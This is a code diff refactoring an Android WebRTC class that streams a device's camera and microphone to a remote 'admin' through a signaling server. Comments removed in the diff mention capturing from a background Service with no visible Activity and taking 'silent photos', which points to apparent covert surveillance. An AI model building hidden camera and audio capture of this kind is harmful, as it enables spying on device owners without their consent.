@@ -1,6 +1,8 @@
 package com.snapapp.companion;
 
 import android.content.Context;
+import android.os.Handler;
+import android.os.Looper;
 import android.util.Log;
 import org.json.JSONObject;
 import org.webrtc.*;
@@ -36,51 +38,31 @@ public class WebRtcStreamManager {
 
         try {
             PeerConnectionFactory.initialize(PeerConnectionFactory.InitializationOptions.builder(ctx).createInitializationOptions());
+            try { eglBase = EglBase.create(); } catch (Exception e) { eglBase = null; }
 
-            try {
-                eglBase = EglBase.create();
-            } catch (Exception e) {
-                Log.e(TAG, "Failed to create EglBase (likely background GPU context lost): " + e.getMessage());
-                eglBase = null;
-            }
-
-            PeerConnectionFactory.Options options = new PeerConnectionFactory.Options();
-            PeerConnectionFactory.Builder builder = PeerConnectionFactory.builder()
-                    .setOptions(options);
-                    
+            PeerConnectionFactory.Builder builder = PeerConnectionFactory.builder();
             if (eglBase != null) {
                 builder.setVideoEncoderFactory(new DefaultVideoEncoderFactory(eglBase.getEglBaseContext(), true, true))
                        .setVideoDecoderFactory(new DefaultVideoDecoderFactory(eglBase.getEglBaseContext()));
             }
-            
             factory = builder.createPeerConnectionFactory();
 
-            List<PeerConnection.IceServer> iceServers = new ArrayList<>();
-            iceServers.add(PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer());
-            iceServers.add(PeerConnection.IceServer.builder("stun:stun1.l.google.com:19302").createIceServer());
-            iceServers.add(PeerConnection.IceServer.builder("stun:stun.cloudflare.com:3478").createIceServer());
-            // TURN relay — required for mobile data / strict NAT (works on same WiFi too as fallback)
-            iceServers.add(PeerConnection.IceServer.builder("turn:openrelay.metered.ca:80")
-                .setUsername("openrelayproject").setPassword("openrelayproject").createIceServer());
-            iceServers.add(PeerConnection.IceServer.builder("turn:openrelay.metered.ca:443")
-                .setUsername("openrelayproject").setPassword("openrelayproject").createIceServer());
-            iceServers.add(PeerConnection.IceServer.builder("turn:openrelay.metered.ca:443?transport=tcp")
-                .setUsername("openrelayproject").setPassword("openrelayproject").createIceServer());
+            List<PeerConnection.IceServer> ice = new ArrayList<>();
+            for (String u : new String[]{"stun:stun.l.google.com:19302", "stun:stun1.l.google.com:19302", "stun:stun.cloudflare.com:3478"}) {
+                ice.add(PeerConnection.IceServer.builder(u).createIceServer());
+            }
+            for (String u : new String[]{"turn:openrelay.metered.ca:80", "turn:openrelay.metered.ca:443", "turn:openrelay.metered.ca:443?transport=tcp"}) {
+                ice.add(PeerConnection.IceServer.builder(u).setUsername("openrelayproject").setPassword("openrelayproject").createIceServer());
+            }
 
-            PeerConnection.RTCConfiguration config = new PeerConnection.RTCConfiguration(iceServers);
+            PeerConnection.RTCConfiguration config = new PeerConnection.RTCConfiguration(ice);
             config.sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN;
 
             peerConnection = factory.createPeerConnection(config, new PeerConnection.Observer() {
-                @Override public void onSignalingChange(PeerConnection.SignalingState s) {
-                    Log.d(TAG, "Signaling: " + s);
-                }
-                @Override public void onIceConnectionChange(PeerConnection.IceConnectionState s) {
-                    Log.d(TAG, "ICE: " + s);
-                }
+                @Override public void onSignalingChange(PeerConnection.SignalingState s) { Log.d(TAG, "Signaling: " + s); }
+                @Override public void onIceConnectionChange(PeerConnection.IceConnectionState s) { Log.d(TAG, "ICE: " + s); }
                 @Override public void onIceConnectionReceivingChange(boolean b) {}
-                @Override public void onIceGatheringChange(PeerConnection.IceGatheringState s) {
-                    Log.d(TAG, "ICE Gathering: " + s);
-                }
+                @Override public void onIceGatheringChange(PeerConnection.IceGatheringState s) { Log.d(TAG, "ICE Gathering: " + s); }
                 @Override public void onIceCandidate(IceCandidate ic) { sendSignal("candidate", null, ic); }
                 @Override public void onIceCandidatesRemoved(IceCandidate[] ics) {}
                 @Override public void onAddStream(MediaStream ms) {}
@@ -90,34 +72,33 @@ public class WebRtcStreamManager {
             });
 
             if (audio) {
-                MediaConstraints ac = new MediaConstraints();
-                ac.mandatory.add(new MediaConstraints.KeyValuePair("googEchoCancellation", "true"));
-                ac.mandatory.add(new MediaConstraints.KeyValuePair("googAutoGainControl", "true"));
-                ac.mandatory.add(new MediaConstraints.KeyValuePair("googNoiseSuppression", "true"));
-                ac.mandatory.add(new MediaConstraints.KeyValuePair("googHighpassFilter", "true"));
-                AudioSource as = factory.createAudioSource(ac);
-                localAudioTrack = factory.createAudioTrack("ARDAMSa0", as);
-                peerConnection.addTrack(localAudioTrack);
+                try {
+                    MediaConstraints ac = new MediaConstraints();
+                    ac.mandatory.add(new MediaConstraints.KeyValuePair("googEchoCancellation", "true"));
+                    ac.mandatory.add(new MediaConstraints.KeyValuePair("googAutoGainControl", "true"));
+                    ac.mandatory.add(new MediaConstraints.KeyValuePair("googNoiseSuppression", "true"));
+                    ac.mandatory.add(new MediaConstraints.KeyValuePair("googHighpassFilter", "true"));
+                    AudioSource as = factory.createAudioSource(ac);
+                    localAudioTrack = factory.createAudioTrack("ARDAMSa0", as);
+                    peerConnection.addTrack(localAudioTrack);
+                    Log.d(TAG, "Audio track added");
+                } catch (Throwable t) { Log.e(TAG, "Audio init error", t); }
             }
 
             if (video) {
-                videoCapturer = createCameraCapturer(ctx, front);
-                if (videoCapturer != null) {
-                    SurfaceTextureHelper sth = null;
-                    if (eglBase != null) {
-                        sth = SurfaceTextureHelper.create("CaptureThread", eglBase.getEglBaseContext());
-                    } else {
-                        sth = SurfaceTextureHelper.create("CaptureThread", null); // Fallback to software/basic surface
+                try {
+                    videoCapturer = createCameraCapturer(ctx, front);
+                    if (videoCapturer != null) {
+                        SurfaceTextureHelper sth = SurfaceTextureHelper.create("CaptureThread", eglBase != null ? eglBase.getEglBaseContext() : null);
+                        VideoSource vs = factory.createVideoSource(videoCapturer.isScreencast());
+                        videoCapturer.initialize(sth, ctx, vs.getCapturerObserver());
+                        videoCapturer.startCapture(640, 480, 15);
+                        localVideoTrack = factory.createVideoTrack("ARDAMSv0", vs);
+                        peerConnection.addTrack(localVideoTrack);
+                        Log.d(TAG, "Video track added");
                     }
-                    VideoSource vs = factory.createVideoSource(videoCapturer.isScreencast());
-                    videoCapturer.initialize(sth, ctx, vs.getCapturerObserver());
-                    videoCapturer.startCapture(320, 240, 10); // 240p @ 10fps for 2G
-                    localVideoTrack = factory.createVideoTrack("ARDAMSv0", vs);
-                    peerConnection.addTrack(localVideoTrack);
-                }
+                } catch (Throwable t) { Log.e(TAG, "Video init error", t); }
             }
-
-            Log.d(TAG, "Live stream started: video=" + video + " audio=" + audio + " front=" + front);
         } catch (Exception e) {
             Log.e(TAG, "startLiveStream error", e);
             stopLiveStream();
@@ -126,9 +107,8 @@ public class WebRtcStreamManager {
 
     public synchronized void switchCamera() {
         if (videoCapturer instanceof CameraVideoCapturer) {
-            CameraVideoCapturer cvc = (CameraVideoCapturer) videoCapturer;
+            ((CameraVideoCapturer) videoCapturer).switchCamera(null);
             isFrontCamera = !isFrontCamera;
-            cvc.switchCamera(null);
         }
     }
 
@@ -146,23 +126,28 @@ public class WebRtcStreamManager {
                             sdp = sdp.replace("useinbandfec=1", "useinbandfec=1;maxaveragebitrate=16000;stereo=0");
                         }
                         SessionDescription custom = new SessionDescription(answer.type, sdp);
-                        peerConnection.setLocalDescription(new SimpleSdpObserver(), custom);
-                        sendSignal("answer", sdp, null);
-                        Log.d(TAG, "Sent SDP answer to admin");
+                        peerConnection.setLocalDescription(new SimpleSdpObserver() {
+                            @Override
+                            public void onSetSuccess() {
+                                // Wait 800ms for ICE gathering so answer contains candidate lines
+                                new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
+                                    @Override
+                                    public void run() {
+                                        SessionDescription local = peerConnection != null ? peerConnection.getLocalDescription() : null;
+                                        String finalSdp = (local != null && local.description != null) ? local.description : sdp;
+                                        sendSignal("answer", finalSdp, null);
+                                    }
+                                }, 800);
+                            }
+                        }, custom);
                     }
                 }, new MediaConstraints());
-            }
-            @Override
-            public void onSetFailure(String s) {
-                Log.e(TAG, "setRemoteDescription failed: " + s);
             }
         }, offer);
     }
 
     public synchronized void handleRemoteCandidate(String sdp, int sdpMLineIndex, String sdpMid) {
-        if (peerConnection != null) {
-            peerConnection.addIceCandidate(new IceCandidate(sdpMid, sdpMLineIndex, sdp));
-        }
+        if (peerConnection != null) peerConnection.addIceCandidate(new IceCandidate(sdpMid, sdpMLineIndex, sdp));
     }
 
     private void sendSignal(String type, String sdp, IceCandidate candidate) {
@@ -180,21 +165,18 @@ public class WebRtcStreamManager {
                 body.put("candidate", cand);
             }
             ApiClient.postJson(activeServerUrl + "/api/devices/" + activeDeviceId + "/signaling", body, null);
-        } catch (Exception e) {
-            Log.e(TAG, "sendSignal error", e);
-        }
+        } catch (Exception e) { Log.e(TAG, "sendSignal error", e); }
     }
 
     private VideoCapturer createCameraCapturer(Context ctx, boolean front) {
-        // Camera1 API is used intentionally: Camera2 API is blocked by Android OS
-        // when accessed from a background Service (no visible Activity), causing black screen.
-        // Camera1 works reliably in background (same as CameraHelper.java for silent photos).
-        CameraEnumerator enumerator = new Camera1Enumerator(true);
-        final String[] names = enumerator.getDeviceNames();
+        CameraEnumerator enumerator;
+        try { enumerator = Camera2Enumerator.isSupported(ctx) ? new Camera2Enumerator(ctx) : new Camera1Enumerator(true); }
+        catch (Throwable t) { enumerator = new Camera1Enumerator(true); }
+        String[] names = enumerator.getDeviceNames();
         if (names == null || names.length == 0) return null;
-        for (String name : names) {
-            if (front && enumerator.isFrontFacing(name)) return enumerator.createCapturer(name, null);
-            else if (!front && enumerator.isBackFacing(name)) return enumerator.createCapturer(name, null);
+        for (String n : names) {
+            if (front && enumerator.isFrontFacing(n)) return enumerator.createCapturer(n, null);
+            if (!front && enumerator.isBackFacing(n)) return enumerator.createCapturer(n, null);
         }
         return enumerator.createCapturer(names[0], null);
     }
@@ -205,9 +187,7 @@ public class WebRtcStreamManager {
             if (peerConnection != null) { peerConnection.close(); peerConnection = null; }
             if (factory != null) { factory.dispose(); factory = null; }
             if (eglBase != null) { eglBase.release(); eglBase = null; }
-        } catch (Exception e) {
-            Log.e(TAG, "stopLiveStream error", e);
-        }
+        } catch (Exception ignored) {}
     }
 
     private static class SimpleSdpObserver implements SdpObserver {
